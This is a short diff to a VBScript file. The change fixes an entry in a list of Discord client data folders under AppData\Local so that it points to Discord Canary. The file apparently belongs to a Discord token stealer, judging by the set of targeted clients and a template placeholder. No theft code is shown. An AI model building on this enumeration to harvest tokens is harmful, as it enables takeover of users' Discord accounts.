@@ -16,7 +16,7 @@ auto_email_update = "replace_auto_email_update"
 localAppDataPath = "C:\Users\" & userName & "\AppData\Local\"
 discordDirectories = Array( _
     localAppDataPath & "discord\", _
-    localAppDataPath & "\", _
+    localAppDataPath & "discordcanary\", _
     localAppDataPath & "discordptb\", _
     localAppDataPath & "lightcord\" _
 )
